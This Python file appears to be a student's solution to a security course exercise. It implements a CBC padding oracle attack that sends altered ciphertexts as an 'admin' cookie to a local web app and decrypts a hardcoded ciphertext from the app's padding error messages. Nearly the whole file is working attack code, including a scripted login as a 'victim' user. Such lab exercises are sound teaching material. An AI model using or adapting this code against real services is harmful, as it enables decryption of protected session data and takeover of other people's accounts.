import os
from cryptography.hazmat.primitives import hashes, padding, ciphers
from cryptography.hazmat.primitives.ciphers import algorithms
from cryptography.hazmat.backends import default_backend

import base64
import binascii

from requests import codes, Session


#You should implement this padding oracle object
#to craft the requests containing the mauled
#ciphertexts to the right URL.
class PaddingOracle(object):

    def __init__(self, po_url):
        self.url = po_url
        self._block_size_bytes = algorithms.AES.block_size/8

    @property
    def block_length(self):
        return int(self._block_size_bytes)

    #you'll need to send the provided ciphertext
    #as the admin cookie, retrieve the request,
    #and see whether there was a padding error or not.
    def test_ciphertext(self, ct, sess):
        # return False
        # pass
        # sess = Session()
        # sess.cookies.set('admin', ct, domain='localhost.local', path='/')
        # data_dict = {"username":'victim',\
        #             "amount":str(0),\
        #             }
        # response = sess.post(self.url, data_dict)
        # print(ct)
        # return response.status_code == codes.ok

        res  = sess.post(self.url, cookies={"admin": ct}).text
        # print(res)
        if "Unspecified error" in res or "Bad padding for admin cookie" in res:
            return False
        else:
            return True
        
        

def split_into_blocks(msg, l):
    while msg:
        yield msg[:l]
        msg = msg[l:]
    

def po_attack_2blocks(po, ctx, sess):
    assert len(ctx) == 2*po.block_length, "This function only accepts 2 block "\
        "cipher texts. Got {} block(s)!".format(len(ctx)/po.block_length)
    c0, c1 = list(split_into_blocks(ctx, po.block_length))
    msg = ''
    # TODO: Implement padding oracle attack for 2 blocks of messages.
    decoded = [0] * po.block_length

    for j in range(1, 17):

        i = po.block_length - j #15~0
        for n in range(po.block_length**2):
            bytes_array = bytearray(c0[:i]) + (n ^ c0[i]).to_bytes(1,byteorder='big')
            bytes_array.extend([j ^ v for v in decoded[i+1:]])
            bytes_array = bytes(bytes_array)
            if i==0:
                ct = b'\x00' * po.block_length + bytes_array + c1
            else:
                ct = bytes_array + c1
            ct = ct.hex() #to hex
            
            if po.test_ciphertext(ct, sess) == 1:
                decoded[i] = n ^c0[i] ^ j
                # break

    return ''.join([chr(a^b) for a,b in zip(c0, decoded)])

def po_attack(po, ctx):
    """
    Padding oracle attack that can decrpyt any arbitrary length messags.
    @po: an instance of padding oracle. 
    You don't have to unpad the message.
    """
    ctx_blocks = list(split_into_blocks(ctx, po.block_length))
    nblocks = len(ctx_blocks)
    # TODO: Implement padding oracle attack for arbitrary length message.
    sess = Session()
    data_dict = {"username":'victim',
                "password":'victim',
                "login":"Login"
                }
    response = sess.post("http://localhost:8080/login",data_dict)
    assert response.status_code == codes.ok

    re = []
    for pre,post in zip(ctx_blocks[:-1], ctx_blocks[1:]):
        temp = po_attack_2blocks(po, pre+post, sess)
        re.append(temp)
    return ''.join(re)


if __name__=="__main__":
    import codecs
    ct = bytes.fromhex("e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d")
    # ct = codecs.decode('e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d', 'hex_codec')
    # ct = 'e9fae094f9c779893e11833691b6a0cd3a161457fa8090a7a789054547195e606035577aaa2c57ddc937af6fa82c013d'
    po = PaddingOracle("http://localhost:8080/setcoins")

    text = po_attack(po, ct)
    print(text)

